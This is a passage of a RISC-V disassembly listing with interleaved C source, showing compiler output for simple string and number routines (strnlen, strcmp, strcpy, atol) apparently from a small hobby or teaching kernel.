    8000264a:	f422                	sd	s0,40(sp)
    8000264c:	1800                	addi	s0,sp,48
    8000264e:	fca43c23          	sd	a0,-40(s0)
    80002652:	fcb43823          	sd	a1,-48(s0)
  const char *p = s;
    80002656:	fd843783          	ld	a5,-40(s0)
    8000265a:	fef43423          	sd	a5,-24(s0)
  while (n-- && *p)
    8000265e:	a031                	j	8000266a <strnlen+0x22>
    p++;
    80002660:	fe843783          	ld	a5,-24(s0)
    80002664:	0785                	addi	a5,a5,1
    80002666:	fef43423          	sd	a5,-24(s0)
  while (n-- && *p)
    8000266a:	fd043783          	ld	a5,-48(s0)
    8000266e:	fff78713          	addi	a4,a5,-1
    80002672:	fce43823          	sd	a4,-48(s0)
    80002676:	c791                	beqz	a5,80002682 <strnlen+0x3a>
    80002678:	fe843783          	ld	a5,-24(s0)
    8000267c:	0007c783          	lbu	a5,0(a5)
    80002680:	f3e5                	bnez	a5,80002660 <strnlen+0x18>
  return p - s;
    80002682:	fe843703          	ld	a4,-24(s0)
    80002686:	fd843783          	ld	a5,-40(s0)
    8000268a:	40f707b3          	sub	a5,a4,a5
}
    8000268e:	853e                	mv	a0,a5
    80002690:	7422                	ld	s0,40(sp)
    80002692:	6145                	addi	sp,sp,48
    80002694:	8082                	ret

0000000080002696 <strcmp>:

int strcmp(const char* s1, const char* s2)
{
    80002696:	7179                	addi	sp,sp,-48
    80002698:	f422                	sd	s0,40(sp)
    8000269a:	1800                	addi	s0,sp,48
    8000269c:	fca43c23          	sd	a0,-40(s0)
    800026a0:	fcb43823          	sd	a1,-48(s0)
  unsigned char c1, c2;

  do {
    c1 = *s1++;
    800026a4:	fd843783          	ld	a5,-40(s0)
    800026a8:	00178713          	addi	a4,a5,1
    800026ac:	fce43c23          	sd	a4,-40(s0)
    800026b0:	0007c783          	lbu	a5,0(a5)
    800026b4:	fef407a3          	sb	a5,-17(s0)
    c2 = *s2++;
    800026b8:	fd043783          	ld	a5,-48(s0)
    800026bc:	00178713          	addi	a4,a5,1
    800026c0:	fce43823          	sd	a4,-48(s0)
    800026c4:	0007c783          	lbu	a5,0(a5)
    800026c8:	fef40723          	sb	a5,-18(s0)
  } while (c1 != 0 && c1 == c2);
    800026cc:	fef44783          	lbu	a5,-17(s0)
    800026d0:	0ff7f793          	andi	a5,a5,255
    800026d4:	cb99                	beqz	a5,800026ea <strcmp+0x54>
    800026d6:	fef44703          	lbu	a4,-17(s0)
    800026da:	fee44783          	lbu	a5,-18(s0)
    800026de:	0ff77713          	andi	a4,a4,255
    800026e2:	0ff7f793          	andi	a5,a5,255
    800026e6:	faf70fe3          	beq	a4,a5,800026a4 <strcmp+0xe>

  return c1 - c2;
    800026ea:	fef44783          	lbu	a5,-17(s0)
    800026ee:	0007871b          	sext.w	a4,a5
    800026f2:	fee44783          	lbu	a5,-18(s0)
    800026f6:	2781                	sext.w	a5,a5
    800026f8:	40f707bb          	subw	a5,a4,a5
    800026fc:	2781                	sext.w	a5,a5
}
    800026fe:	853e                	mv	a0,a5
    80002700:	7422                	ld	s0,40(sp)
    80002702:	6145                	addi	sp,sp,48
    80002704:	8082                	ret

0000000080002706 <strcpy>:

char* strcpy(char* dest, const char* src)
{
    80002706:	7179                	addi	sp,sp,-48
    80002708:	f422                	sd	s0,40(sp)
    8000270a:	1800                	addi	s0,sp,48
    8000270c:	fca43c23          	sd	a0,-40(s0)
    80002710:	fcb43823          	sd	a1,-48(s0)
  char* d = dest;
    80002714:	fd843783          	ld	a5,-40(s0)
    80002718:	fef43423          	sd	a5,-24(s0)
  while ((*d++ = *src++))
    8000271c:	0001                	nop
    8000271e:	fd043703          	ld	a4,-48(s0)
    80002722:	00170793          	addi	a5,a4,1
    80002726:	fcf43823          	sd	a5,-48(s0)
    8000272a:	fe843783          	ld	a5,-24(s0)
    8000272e:	00178693          	addi	a3,a5,1
    80002732:	fed43423          	sd	a3,-24(s0)
    80002736:	00074703          	lbu	a4,0(a4)
    8000273a:	00e78023          	sb	a4,0(a5)
    8000273e:	0007c783          	lbu	a5,0(a5)
    80002742:	fff1                	bnez	a5,8000271e <strcpy+0x18>
    ;
  return dest;
    80002744:	fd843783          	ld	a5,-40(s0)
}
    80002748:	853e                	mv	a0,a5
    8000274a:	7422                	ld	s0,40(sp)
    8000274c:	6145                	addi	sp,sp,48
    8000274e:	8082                	ret

0000000080002750 <atol>:

long atol(const char* str)
{
    80002750:	7179                	addi	sp,sp,-48
    80002752:	f422                	sd	s0,40(sp)
    80002754:	1800                	addi	s0,sp,48
    80002756:	fca43c23          	sd	a0,-40(s0)
  long res = 0;
    8000275a:	fe043423          	sd	zero,-24(s0)
  int sign = 0;
    8000275e:	fe042223          	sw	zero,-28(s0)

  while (*str == ' ')
    80002762:	a031                	j	8000276e <atol+0x1e>
    str++;
    80002764:	fd843783          	ld	a5,-40(s0)
    80002768:	0785                	addi	a5,a5,1
    8000276a:	fcf43c23          	sd	a5,-40(s0)
  while (*str == ' ')
    8000276e:	fd843783          	ld	a5,-40(s0)
    80002772:	0007c783          	lbu	a5,0(a5)
    80002776:	873e                	mv	a4,a5
    80002778:	02000793          	li	a5,32
    8000277c:	fef704e3          	beq	a4,a5,80002764 <atol+0x14>

  if (*str == '-' || *str == '+') {
    80002780:	fd843783          	ld	a5,-40(s0)
    80002784:	0007c783          	lbu	a5,0(a5)
    80002788:	873e                	mv	a4,a5
    8000278a:	02d00793          	li	a5,45
    8000278e:	00f70b63          	beq	a4,a5,800027a4 <atol+0x54>
    80002792:	fd843783          	ld	a5,-40(s0)
    80002796:	0007c783          	lbu	a5,0(a5)
    8000279a:	873e                	mv	a4,a5
    8000279c:	02b00793          	li	a5,43
    800027a0:	06f71263          	bne	a4,a5,80002804 <atol+0xb4>
    sign = *str == '-';
    800027a4:	fd843783          	ld	a5,-40(s0)
    800027a8:	0007c783          	lbu	a5,0(a5)
    800027ac:	0007871b          	sext.w	a4,a5
    800027b0:	02d00793          	li	a5,45
    800027b4:	40f707b3          	sub	a5,a4,a5
    800027b8:	0017b793          	seqz	a5,a5
    800027bc:	0ff7f793          	andi	a5,a5,255
    800027c0:	fef42223          	sw	a5,-28(s0)
    str++;
    800027c4:	fd843783          	ld	a5,-40(s0)
    800027c8:	0785                	addi	a5,a5,1
    800027ca:	fcf43c23          	sd	a5,-40(s0)
  }

  while (*str) {
    800027ce:	a81d                	j	80002804 <atol+0xb4>
    res *= 10;
    800027d0:	fe843703          	ld	a4,-24(s0)
    800027d4:	87ba                	mv	a5,a4
    800027d6:	078a                	slli	a5,a5,0x2
    800027d8:	97ba                	add	a5,a5,a4
    800027da:	0786                	slli	a5,a5,0x1
    800027dc:	fef43423          	sd	a5,-24(s0)
    res += *str++ - '0';
    800027e0:	fd843783          	ld	a5,-40(s0)
    800027e4:	00178713          	addi	a4,a5,1
    800027e8:	fce43c23          	sd	a4,-40(s0)
    800027ec:	0007c783          	lbu	a5,0(a5)
    800027f0:	2781                	sext.w	a5,a5
    800027f2:	fd07879b          	addiw	a5,a5,-48
    800027f6:	2781                	sext.w	a5,a5
    800027f8:	873e                	mv	a4,a5
    800027fa:	fe843783          	ld	a5,-24(s0)
    800027fe:	97ba                	add	a5,a5,a4
    80002800:	fef43423          	sd	a5,-24(s0)
  while (*str) {
    80002804:	fd843783          	ld	a5,-40(s0)
    80002808:	0007c783          	lbu	a5,0(a5)
    8000280c:	f3f1                	bnez	a5,800027d0 <atol+0x80>
  }

  return sign ? -res : res;
    8000280e:	fe442783          	lw	a5,-28(s0)
    80002812:	2781                	sext.w	a5,a5
    80002814:	c791                	beqz	a5,80002820 <atol+0xd0>
    80002816:	fe843783          	ld	a5,-24(s0)
    8000281a:	40f007b3          	neg	a5,a5
    8000281e:	a019                	j	80002824 <atol+0xd4>
    80002820:	fe843783          	ld	a5,-24(s0)
}
    80002824:	853e                	mv	a0,a5
    80002826:	7422                	ld	s0,40(sp)
    80002828:	6145                	addi	sp,sp,48
    8000282a:	8082                	ret
